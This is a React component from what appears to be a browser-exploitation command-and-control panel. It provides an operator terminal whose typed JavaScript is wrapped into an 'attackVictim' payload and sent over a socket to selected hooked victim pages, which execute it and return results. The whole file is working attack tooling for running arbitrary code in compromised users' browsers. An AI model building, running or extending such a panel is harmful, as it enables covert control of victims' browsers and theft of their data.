import React, {Component} from 'react'
import PropTypes from 'prop-types'
import {connect} from 'react-redux'
import {bindActionCreators} from 'redux'
import $ from 'jquery'
import 'jquery.terminal'
import 'jquery.terminal/css/jquery.terminal.min.css'
import * as terminalActions from '../../actions/terminal'

class Terminal extends Component {
  componentDidMount() {
    let term = $('#terminal').terminal(this._commandHandler.bind(this), {
      greetings: 'Actions are logged here.\nAdditionally, you can use this terminal to execute commands on selected targets.',
      height: 300,
      prompt: '[whoof]:~$ '
    })
    term.hover(term.focus)
    term.focusout(()=>{ term.focus(false) })
    this.props.actions.setLogger(function(text){
      let d = new Date()
      $.terminal.active().echo(`[${d.toLocaleTimeString()}]: ${text}`)
    })
    this.props.socket.on('message', function(message){
      let d = new Date()
      $.terminal.active().echo(`[${d.toLocaleTimeString()}]: ${message}`)
    })
  }

  _commandHandler(command, term) {
    if (command !== '') {
      let { victims } = this.props
      let activeTargetSocketIds = Object.keys(this.props.activeTargets).reduce((socketIds, targetId)=>{
        let target = victims[targetId]
        Object.values(target.activePagesBySocketId).forEach((page)=>{
          if(page.targeted){
            socketIds.push(page.socketId)
          }
        })
        return socketIds
      },[])

      if(activeTargetSocketIds.length === 0){
        term.echo('Select a target first')
      }

      if(command.startsWith('/w')){
        command = `sendMessage("${command.slice(2)}")`
      }

      activeTargetSocketIds.forEach((socketId)=>{
        this.props.logger(`Executing command line attack on victim ${this.props.victimIdBySocketIdMap[socketId]}...`)
        let attackInstanceId = `${socketId}_${new Date().valueOf()}`
        this.props.followupBuffer[attackInstanceId] = function(params, logger){}
        this.props.socket.emit('attackVictim', {
          victimSocket: socketId,
          attack: `function(params){
            params.time = new Date();
            let _result_ = (function(){ ${command} })()
            try{
              socket.emit("result", {
                success: true,
                message: "Successfully executed custom command at " + new Date() + (_result_ ? "\\nReturned Value: " + _result_ : ''),
                params
              });
            }catch(e){
              socket.emit("result", {
                success: false,
                message: e.toString(),
                params
              });
            }
          }`,
          params: {victim: this.props.victimIdBySocketIdMap[socketId], id: attackInstanceId}
        })
      })
    }
  }

  render() {
    return (
      <div className="block">
        <div id="terminal"></div>
      </div>
    )
  }
}

Terminal.propTypes = {
  actions: PropTypes.object,
  activeTargets: PropTypes.object,
  victims: PropTypes.object,
  followupBuffer: PropTypes.object.isRequired,
  socket: PropTypes.object.isRequired,
  victimIdBySocketIdMap: PropTypes.object
}

function mapStateToProps(state, props) {
  return {
    activeTargets: state.victims.activeTargets,
    victims: state.victims.victims,
    followupBuffer: state.attacks.followupBuffer,
    logger: state.terminal.logger,
    victimIdBySocketIdMap: state.victims.victimIdBySocketIdMap
  }
}

function mapDispatchToProps(dispatch) {
  return {
    actions: bindActionCreators(terminalActions, dispatch)
  }
}

export default connect(mapStateToProps, mapDispatchToProps)(Terminal)
